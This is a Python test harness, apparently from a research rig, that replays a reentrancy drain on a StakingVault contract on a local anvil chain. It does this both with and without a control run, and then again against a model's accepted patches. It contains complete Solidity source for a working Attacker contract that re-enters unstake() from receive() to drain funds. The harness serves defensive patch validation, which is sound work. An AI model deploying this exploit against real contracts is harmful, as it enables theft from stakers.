#!/usr/bin/env python3
"""The StakingVault drain as real transactions on a real chain -- and against the patches.

The same shape as scripts/live_attack.py, on the finals demo contract. Nothing here is
asserted in Solidity and nothing is pranked: three funded accounts sign transactions on
anvil, and every number is a balance the node reports.

The attack is NOT one a model wrote. It is the DRAIN attacker from
scripts/victim_probe.py, written by hand on 7/28 to calibrate the victim_loss predicate
(it re-enters unstake() up to eight times from receive()). The model's own exploit only
harms the victim at eight rounds in the synthetic harness and does not survive
translation to a chain (reports/live_replay_stakingvault_2026-10-28.md). The patches ARE
the model's: arbiter-gpt's accepted diffs for spark-test-2/3/4.

    python3 scripts/live_attack_stakingvault.py                       # vault is drained
    python3 scripts/live_attack_stakingvault.py --patched spark-test-2  # same attack fails

Each run uses two chains from genesis: one where the attacker calls attack(), and a
control where every other transaction is identical and attack() is never sent.

Scenario (amounts from victim_probe's DRAIN spec; the deployment matches spark-test-2's
arbSetup, `new StakingVault{value: 5 ether}()`):
  deployer  deploys StakingVault with 5 ETH (its own stake)
  victim    stakes 2 ETH
  attacker  deploys the DRAIN Attacker with 1 ETH (the one ether attack() stakes)
  attacker  calls attack()                      <- the control chain skips this
  victim    calls unstake()
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import tempfile
from pathlib import Path

RIG = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RIG))
sys.path.insert(0, str(RIG / "scripts"))

import victim_probe as vp  # noqa: E402
from arbiter.live import (  # noqa: E402
    ChainUnavailable,
    LiveChain,
    Step,
    Transcript,
    assert_no_cheatcodes,
)
from arbiter.patch import apply_diff  # noqa: E402

TARGET = RIG / "examples" / "StakingVault.sol"
RUNS = RIG / "runs"

# victim_probe.ATTACKER, verbatim. Kept as text here so the script says what it runs;
# checked against the original at start-up so the two cannot drift apart.
ATTACKER = """
contract Attacker {
    StakingVault public v;
    uint256 public hits;
    constructor(address _v) payable { v = StakingVault(payable(_v)); }
    function attack() external {
        v.stake{value: 1 ether}();
        v.unstake();
    }
    receive() external payable {
        if (hits < 8 && address(v).balance >= 1 ether) { hits++; v.unstake(); }
    }
}
"""

ETHER = 10**18
DEPLOY_WEI = 5 * ETHER      # victim_probe DRAIN: new StakingVault{value: 5 ether}()
VICTIM_WEI = 2 * ETHER      # victim_probe DRAIN: target.stake{value: 2 ether}()
ATTACKER_WEI = 1 * ETHER    # attack() stakes exactly 1 ether; that is its capital


def _norm(text: str) -> str:
    return " ".join(text.split())


def _check_sources() -> None:
    assert _norm(ATTACKER) == _norm(vp.ATTACKER), "Attacker differs from victim_probe.ATTACKER"
    assert "{value: 5 ether}" in vp.DRAIN["deploy_code"], vp.DRAIN["deploy_code"]
    assert "{value: 2 ether}" in vp.DRAIN["victim_enter"], vp.DRAIN["victim_enter"]
    assert_no_cheatcodes(ATTACKER, "the DRAIN attacker contract")


def _target_source(patched_run: str | None) -> tuple[str, dict]:
    source = TARGET.read_text(encoding="utf-8")
    if not patched_run:
        return source, {"target": "original", "path": str(TARGET)}
    path = RUNS / f"{patched_run}.patches.jsonl"
    rec = next(json.loads(l) for l in path.read_text(encoding="utf-8").splitlines()
               if l.strip() and json.loads(l).get("status") == "accepted")
    patched, err = apply_diff(source, rec["diff"])
    if patched is None:
        raise SystemExit(f"patch from {path} does not apply: {err}")
    return patched, {"target": "patched", "patches": str(path), "model": rec.get("model"),
                     "changed_lines": rec.get("changed_lines"),
                     "patched_sha256": rec.get("patched_sha256")}


def _project(root: Path, target_source: str) -> Path:
    proj = root / "live"
    (proj / "src").mkdir(parents=True)
    (proj / "foundry.toml").write_text(
        '[profile.default]\nsrc = "src"\nout = "out"\nlibs = []\n'
        "auto_detect_solc = true\n",
        encoding="utf-8",
    )
    (proj / "src" / "StakingVault.sol").write_text(target_source, encoding="utf-8")
    (proj / "src" / "Attacker.sol").write_text(
        "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
        'import "./StakingVault.sol";\n' + ATTACKER, encoding="utf-8")
    return proj


def run_world(proj: Path, port: int, with_attack: bool) -> dict:
    """One chain from genesis. Returns the transcript and what the node reported."""
    chain = LiveChain(port=port)
    chain.start()
    try:
        t = Transcript(rpc=chain.rpc, chain_id=chain.chain_id())
        deployer, victim, attacker = chain.accounts[0], chain.accounts[1], chain.accounts[2]

        target, tx = chain.deploy(proj, "src/StakingVault.sol:StakingVault", deployer.key,
                                  value_wei=DEPLOY_WEI)
        t.target = target
        t.steps.append(Step(what="deploy StakingVault (5 ETH)", actor=deployer.address, tx=tx))
        t.steps.append(chain.send(victim.key, target, "stake()", value_wei=VICTIM_WEI))

        atk, tx = chain.deploy(proj, "src/Attacker.sol:Attacker", attacker.key,
                               ctor=[target], value_wei=ATTACKER_WEI)
        t.attacker_contract = atk
        t.steps.append(Step(what="deploy Attacker (1 ETH)", actor=attacker.address, tx=tx))

        def snap() -> dict:
            return {"target": chain.balance(target),
                    "attacker_eoa": chain.balance(attacker.address),
                    "attacker_contract": chain.balance(atk),
                    "victim": chain.balance(victim.address)}

        before = snap()
        t.balances["before_attack"] = before
        if with_attack:
            t.steps.append(chain.send(attacker.key, atk, "attack()"))
        after_attack = snap()
        t.balances["after_attack"] = after_attack

        exit_step = chain.send(victim.key, target, "unstake()")
        t.steps.append(exit_step)
        after_exit = snap()
        t.balances["after_victim_exit"] = after_exit

        # What the vault actually paid the victim on the way out, read from the node:
        # unstake() only ever sends to msg.sender, so the vault's balance drop during the
        # victim's own transaction is the victim's recovery, independent of gas.
        recovered = (after_attack["target"] - after_exit["target"]) if exit_step.ok else 0
        return {
            "with_attack": with_attack,
            "transcript": t.as_dict(),
            "recovered": recovered,
            "drained": before["target"] - after_attack["target"],
            "attacker_gain": after_attack["attacker_contract"] - before["attacker_contract"],
            "attacker_net": (after_attack["attacker_eoa"] + after_attack["attacker_contract"]
                             - before["attacker_eoa"] - before["attacker_contract"]),
            "exit_ok": exit_step.ok,
        }
    finally:
        chain.stop()


# cast's error is JSON with escaped quotes; only the tail survives in the step note.
_REVERT_REASON_RE = re.compile(r'Error\(\\*"(.*?)\\*"\)')


def _revert_line(step: dict) -> str:
    """Display only: the revert reason, not the raw cast error (that stays in the JSON).

    No tx hash plus a decoded reason means cast never sent it: `cast send` estimates gas
    first, the node ran the call, it reverted, and nothing was signed onto the chain.
    """
    m = _REVERT_REASON_RE.search(step.get("note") or "")
    if not m:
        return "reverted（原因見 JSON transcript）"
    line = f"reverted: {m.group(1)}"
    if not step.get("tx"):
        line += "\n        （節點在估算 gas 時就拒絕，交易沒有送出上鏈）"
    return line


def _eth(wei: int) -> str:
    return f"{wei / ETHER:.6f}".rstrip("0").rstrip(".") + " ETH"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8600)
    ap.add_argument("--json", type=Path, default=None)
    ap.add_argument("--patched", default=None, metavar="RUN_ID",
                    help="apply the accepted diff in runs/<RUN_ID>.patches.jsonl; "
                         "the attack must FAIL")
    args = ap.parse_args()

    _check_sources()
    source, meta = _target_source(args.patched)

    with tempfile.TemporaryDirectory() as tmp:
        proj = _project(Path(tmp), source)
        try:
            control = run_world(proj, args.port, with_attack=False)
            attacked = run_world(proj, args.port + 1, with_attack=True)
        except ChainUnavailable as exc:
            print(f"  cannot start a chain: {exc}")
            return 2

    for w in (control, attacked):
        print(f"  {'attack chain ' if w['with_attack'] else 'control chain'} "
              f"(chain {w['transcript']['chain_id']}, {w['transcript']['rpc']})")
        for s in w["transcript"]["steps"]:
            if s["ok"]:
                print(f"    ok  {s['what']:<30} tx={s['tx'] or '-'}  gas={s['gas_used']:,}")
            else:
                print(f"    REV {s['what']:<30} {_revert_line(s)}")
        b = w["transcript"]["balances"]
        print(f"    vault {_eth(b['before_attack']['target'])} -> "
              f"{_eth(b['after_attack']['target'])} after attack step -> "
              f"{_eth(b['after_victim_exit']['target'])} after victim exit")

    victim_paid_in = VICTIM_WEI
    victim_recovered = attacked["recovered"]
    # The rule from scripts/live_attack.py, unchanged:
    #   proven = drained > 0 and attacker_net > 0 and victim_recovered < victim_paid_in
    verdict = {
        "rule": "live_attack.py: drained > 0 and attacker_net > 0 and "
                "victim_recovered < victim_paid_in",
        "A_recovered_control_wei": control["recovered"],
        "B_recovered_attacked_wei": victim_recovered,
        "G_attacker_contract_gain_wei": attacked["attacker_gain"],
        "attacker_net_incl_gas_wei": attacked["attacker_net"],
        "target_drained_wei": attacked["drained"],
        "victim_paid_in_wei": victim_paid_in,
        "victim_shortfall_wei": victim_paid_in - victim_recovered,
        "proven": bool(attacked["drained"] > 0 and attacked["attacker_net"] > 0
                       and victim_recovered < victim_paid_in),
    }
    print(f"\n  target: {meta['target']}"
          + (f" ({meta['patches']}, {meta['model']}, {meta['changed_lines']} lines)"
             if meta["target"] == "patched" else ""))
    print(f"  A  victim recovered, control chain   {_eth(verdict['A_recovered_control_wei']):>12}")
    print(f"  B  victim recovered, attack chain    {_eth(victim_recovered):>12}"
          f"   (paid in {_eth(victim_paid_in)})")
    print(f"  G  attacker contract gain            {_eth(attacked['attacker_gain']):>12}"
          f"   (net incl. gas {_eth(attacked['attacker_net'])})")
    print(f"     vault drained by the attack step  {_eth(attacked['drained']):>12}")
    if verdict["proven"]:
        print("\n  PROVEN on a live chain: value left the vault, the attacker holds it,\n"
              "  and the victim who staked 2 ETH did not get it back.")
    else:
        print("\n  NOT PROVEN. The transcript above is what actually happened.")

    if args.json:
        args.json.write_text(json.dumps({"meta": meta, "verdict": verdict,
                                         "control": control, "attacked": attacked},
                                        indent=1), encoding="utf-8")
        print(f"\n  transcript: {args.json}")
    proven = verdict["proven"]
    return (1 if proven else 0) if args.patched else (0 if proven else 1)


if __name__ == "__main__":
    raise SystemExit(main())
